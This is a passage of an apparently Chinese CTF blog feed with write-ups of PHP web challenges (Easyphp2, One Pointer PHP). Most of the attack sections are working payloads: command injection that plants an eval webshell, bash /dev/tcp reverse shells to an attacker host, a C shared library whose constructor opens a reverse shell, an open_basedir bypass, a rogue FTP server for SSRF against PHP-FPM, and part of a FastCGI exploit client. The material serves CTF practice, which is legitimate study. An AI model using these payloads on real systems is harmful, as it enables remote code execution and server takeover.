class="token keyword">print</span><span class="token punctuation">(</span>launch<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由结果推过程，那大概就是先设置变量作为需要执行的命令，然后<code>lanuch</code>就会运行。</p><p>这真想不到，太难了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/Giftbox/readme_zh.md">https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/Giftbox/readme_zh.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[羊城杯 2020]Easyphp2</title>
      <link href="/p/626647139.html"/>
      <url>/p/626647139.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[su|伪协议|二次编码伪协议]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172547035.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看robots.txt</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172557618.png"></p><p>然后用伪协议，有过滤。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921172759397.png"></p><p>二次编码绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有其他编码</p><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16be&#x2F;resource&#x3D;GWHT.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;GWHT.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>GWHT.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_execution_time'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'PASS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;h2>'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;hacker>'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;h2>'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;h1>'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'404'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;h1>'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'Sorry, only people from GWHT are allowed to access this website.'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'23333'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"count"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/;|base64|rot13|base32|base16|&lt;\?php|#/i'</span><span class="token punctuation">,</span> <span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>The Count is: "</span> <span class="token operator">.</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'printf \''</span> <span class="token operator">.</span> <span class="token variable">$count</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' | wc -c'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h2>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>check.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GWHT"</span><span class="token punctuation">;</span><span class="token comment">// Cookie password.</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Here is nothing, isn't it ?"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显了，把cookie改为GWHT，然后写个马</p><pre class="line-numbers language-none"><code class="language-none">1&#39;|echo &quot;&lt;?&#x3D;@eval(\$_POST[cmd])?&gt;&quot;&gt;&#39;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180209809.png"></p><p>进蚁剑，找了找</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180927522.png"></p><p>权限不够</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921180950522.png"></p><p>怪，还搜索不到，可能是权限不够就中断了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181123009.png"></p><p>文件需要GWHT</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921182455114.png"></p><p>这有个hash</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181218999.png"></p><p>解码为GWHTCTF</p><p>在蚁剑中可以这样登录并执行命令</p><pre class="line-numbers language-none"><code class="language-none">printf &quot;GWHTCTF&quot; | su - GWHT -c &#39;cat &#x2F;GWHT&#x2F;system&#x2F;of&#x2F;a&#x2F;down&#x2F;flag.txt&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921181525055.png" alt="、"></p><p>也可以反弹shell</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">1&#39;&amp;&amp;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999 0&gt;&amp;1&quot;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">su - GWHT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-Easyphp2/image-20210921183446130.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[蓝帽杯 2021]One Pointer PHP</title>
      <link href="/p/4276277983.html"/>
      <url>/p/4276277983.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[PHP数组溢出|提权|fpm]</p><p>add_api.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>   <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>   <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>user.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>只要想办法让<code>$count[]=1</code>执行不成功，就能RCE。</p><p>测试了半天，除了让<code>$count=1</code>之外，想不出什么办法了。</p><p>最后没想到是数组溢出，之前也随手测试过99999999999999999999999999999999，可惜数字太大反而没测出来。</p><h4 id="PHP数组溢出"><a href="#PHP数组溢出" class="headerlink" title="PHP数组溢出"></a>PHP数组溢出</h4><p><a href="https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/">PHP数组的key溢出问题</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span> <span class="token operator">=</span> <span class="token number">9223372036854775806</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171147429.png"></p><p>序列化一下，打入，结束。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171241608.png"></p><p>system被禁了，可惜。</p><p>写个马进去看看。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920171851484.png"></p><p>天真了，还以为这题就这么简单，是我太天真，试了几个通用的绕过disable_function都不行。</p><p>这有个easy_bypass模块，正常来说应该是把这个模块扒下来pwn掉</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920174534322.png"></p><p>写个open_basedir绕过，然后通过<code>/proc/self/maps</code>查找<code>easy_bypass.so</code>路径</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sandbox/660bef445e619cf44695fec04f93e4f7ff60e252"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'decadefirst'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'decadefirst'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>f<span class="token punctuation">]</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//复制文件</span><span class="token comment">//var_dump(copy("/usr/local/lib/php/extensions/no-debug-non-zts-20190902/easy_bypass.so",'/var/www/html/test.so'));</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920174916052.png"></p><p>可惜不会pwn，另寻他法。</p><p>fpm打开的，读取<code>/usr/local/etc/php-fpm.d/www.conf</code>找下监听地址。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920175059987.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920175136952.png"></p><p>也可以通过查找<code>/etc/nginx/nginx.conf</code>，发现<code>include /etc/nginx/sites-enabled/*;</code>，然后读取<code>/etc/nginx/sites-enabled/default</code>找到监听地址。</p><blockquote><p>发现 php-fpm 绑定在了本地9001端口上。</p><p>我们可以利用ssrf攻击本地的 php-fpm。我们可以通过在vps上搭建恶意的ftp，骗取目标主机将payload转发到自己的9001端口上，从而执行命令。</p><p>FTP 协议允许通过 TCP 发送二进制数据包，更准确的说是该协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。</p><p>现在，如果我们传入?file=<a href="ftp://evil-server/file.txt&amp;data=payload%EF%BC%8C%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%A5%E4%B8%8B%E6%83%85%E5%86%B5%EF%BC%9A">ftp://evil-server/file.txt&amp;data=payload，会发生以下情况：</a></p><p>首先通过 file_put_contents() 函数连接到我们的FTP服务器，并试图使用 file_put_contents() 把文件上传上去。但是我们搭建的恶意的ftp服务器将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。</p><p>摘录自：<a href="http://www.hackdig.com/05/hack-342091.htm">http://www.hackdig.com/05/hack-342091.htm</a></p></blockquote><p>百度看了下，蚁剑的那个插件需要做些改动就能打了</p><p>试了半天改设置不行，看来只能手动了。</p><h3 id="Fastcgi-PHP-FPM-bypass"><a href="#Fastcgi-PHP-FPM-bypass" class="headerlink" title="Fastcgi/PHP_FPM bypass"></a>Fastcgi/PHP_FPM bypass</h3><h4 id="构造-so"><a href="#构造-so" class="headerlink" title="构造.so"></a>构造.so</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/50.x.x.25/9999 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译一下</p><pre class="line-numbers language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后上传到/tmp</p><h4 id="开启恶意FTP服务"><a href="#开启恶意FTP服务" class="headerlink" title="开启恶意FTP服务"></a>开启恶意FTP服务</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#这里是ftp的端口</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span><span class="token comment">#Service ready for new user.</span><span class="token comment">#Client send anonymous username</span><span class="token comment">#USER anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token comment">#User name okay, need password.</span><span class="token comment">#Client send anonymous password.</span><span class="token comment">#PASS anonymous</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token comment">#TYPE I</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token comment">#Size /</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token comment">#EPSV (1)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span><span class="token comment">#PASV</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#STOR / (2)</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token comment">#QUIT</span>conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><p>脚本出自<a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/fcgi_jailbreak.php">webcgi-exploits</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token 